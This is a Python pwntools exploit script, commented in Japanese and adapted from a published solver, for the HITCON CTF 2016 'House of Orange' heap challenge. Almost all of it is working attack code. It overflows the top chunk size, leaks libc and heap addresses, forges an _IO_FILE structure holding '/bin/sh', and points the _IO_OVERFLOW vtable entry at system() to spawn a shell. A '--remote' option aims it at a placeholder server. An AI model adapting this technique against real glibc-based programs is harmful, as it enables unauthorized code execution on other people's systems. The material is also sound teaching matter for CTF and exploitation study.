#!/usr/bin/env python2
# -*- coding: utf-8 -*-

# tmuxの上で、python2 solver.py により別ペインでgdb開いて実行&デバッグ
# python2 solver.py --local でローカルで攻撃
# python2 solver.py --attach でローカルで攻撃してgdbアタッチ
# python2 solver.py --remoteでリモート攻撃

# ぱくりました・コメントつけました・デバッグしやすいよう書き換えました・　https://github.com/scwuaptx/CTF/blob/master/2016-writeup/hitcon/houseoforange.py
# 元のソルバ作成者
# Author : Angelboy
# http://blog.angelboy.tw
# Writeup: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html

# でもWriteupはこっちのがわかりやすい: https://1ce0ear.github.io/2017/11/26/study-house-of-orange/

from pwn import *
from subprocess import Popen, PIPE
from time import sleep
import sys


binary_file = './houseoforange'
libc_file   = '/lib/x86_64-linux-gnu/libc.so.6' 

context.arch = 'amd64'
context.os   = 'linux'
#context.binary = binary_file  #contextをバイナリから設定してくれる
context.terminal  = ['tmux', 'split-window', '-h']
context.log_level = "DEBUG"

binary_o = ELF(binary_file)
libc_o   = ELF(libc_file)
env = { "LD_PRELOAD": libc_file }  #リモートのlibcをセットしたときに必要

# よくわかってない
gdbscript = '''
file {binary_file}

peda

# commands for fork-server
# set follow-fork-mode child
# set follow-fork-mode parent

# load structure info
# add-symbol-file symbol.o 0

# code base address and heap base address when PIC is enabled
set $code = 0x555555554000
set $heap = 0x555555757000

# define functions here

# define breakpoints here
# after menu
# b *0x5555555553d5
# entering build
b *0x5555555553fd
# entering upgrade
b *0x555555555415
# entering see
b *0x555555555409

'''.replace('{binary_file}', binary_file)

# パディングもしてくれるu64 (64bitアンパック)
def u64x(data):
    return u64(data.ljust(8, '\0'))

def p64x(*nums):
    data = ''
    for num in nums:
        data += p64(num)
    return data

def create_socket():
    remote_host = "hoge.com"
    port = 65525

    if len(sys.argv) == 2 and sys.argv[1] == '--local':
        # ローカルで攻撃
        tube = process([binary_file], env=env, stderr=sys.stderr)
    elif len(sys.argv) == 2 and sys.argv[1] == '--attach':
        # ローカルで攻撃してgdbをアタッチ
        tube = process([binary_file], env=env, stderr=sys.stderr)
        gdb.attach(tube, gdbscript=gdbscript)
    elif len(sys.argv) == 2 and sys.argv[1] == '--remote':
        # リモートで攻撃（本番）
        tube = remote(remote_host, port)
    else:
        # デフォルトではローカルでgdbでデバッグ
        tube = gdb.debug([binary_file], aslr=False, env=env, gdbscript=gdbscript)

    return tube



# -------^^^以上テンプレ^^^----------


# コマンド1 Buildに相当
def build(r,size,name,price,color):
    print 'build: {}'.format(name)

    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))

# コマンド2 Seeに相当
def see(r):
    r.recvuntil(":")
    r.sendline("2")
    data = r.recvuntil("+++++++++++++++++++++++++++++++++++++")
    return data

# コマンド3 Upgradeに相当
def upgrade(r,size,name,price,color):
    print 'upgrade: {}'.format(name)

    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))
    r.recvuntil(":")
    r.sendline(str(color))

# この中に攻撃コードを書く
def attack(r):
    build(r, 0x18, 'A' * 8, 0, 1)

    payload = 'B' * 0x38 + p64(0xf98 + 8| 1)
    upgrade(r, 0x48, payload, 0, 1)

    build(r, 0xff8, 'C' * 8, 0, 1)

    build(r, 0x400, 'D' * 8, 0, 1)
    data = see(r)
    addr_main_arena = u64(data[data.find('DDDDDDDD')+8:data.find('\nPrice')].ljust(8, '\x00'))
    print hex(addr_main_arena)
    addr_libc = addr_main_arena - 0x3c510a
    print 'addr_libc = {}'.format(hex(addr_libc))

    upgrade(r, 0x400, 'E' * 0x10, 0, 1)
    data = see(r)
    addr_heap = u64(data[data.find('EEEEEEEE')+16:data.find('\nPrice')].ljust(8, '\x00')) - 0xa
    print 'addr_heap = {}'.format(hex(addr_heap))

    addr_io_list_all = addr_libc + libc_o.symbols['_IO_list_all']
    addr_io_file = addr_heap + 0x4f0
    addr_vtable = addr_io_file + 0xe0 + 8 * 3

    payload = ''
    payload += 'F' * 0x420

    # fake _IO_FILE that it will satisfy constraints that is requeired to call _IO_OVERFLOW on abort.
    # for detailed constraints check genops.c line 779~786.
    # also check definition of _IO_FILE in libio.h, be careful that _IO_FILE_complete is NOT defined since it is excluded by the macro.
    io_file  = '' # this is fake _IO_file and fake malloc chunk at the same time
    io_file += '/bin/sh\x00' # prev_size
    io_file += p64(0x61) # size
    io_file += p64(0xdeadbeaf) # fd
    io_file += p64(addr_io_list_all - 0x10) # bk
    io_file += p64(0) + p64(1) # fake _IO_write_ptr & _IO_write_base to bypass check; could be any value
    io_file  = io_file.ljust(0xa0, '\x00') # pad uninteresting _IO_file attributes
    io_file += p64(addr_io_file) # fake _IO_FILE._wide_data; constraint: (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
    io_file  = io_file.ljust(0xc0, '\x00')
    io_file += p64(0) # fake _IO_file._mode; constraint: fp->_mode > 0
    io_file  = io_file.ljust(0xc4)
    io_file += p64(0) # pad
    io_file += p64(0) # pad
    io_file += p64(addr_vtable)

    payload += io_file
    payload += p64(1) # paddings? not sure
    payload += p64(2)
    payload += p64(3)
    payload += p64(0) * 3 # vtable starts here
    payload += p64(addr_libc + libc_o.symbols['system']) # overwrite _IO_OVERFLOW

    upgrade(r, 0x800, payload, 0, 1)

    print 'build again'
    r.recvuntil(':')
    r.sendline('1')

    r.interactive()


# -------^^^以下テンプレ^^^----------
if __name__ == '__main__':
    tube = create_socket()
    attack(tube)
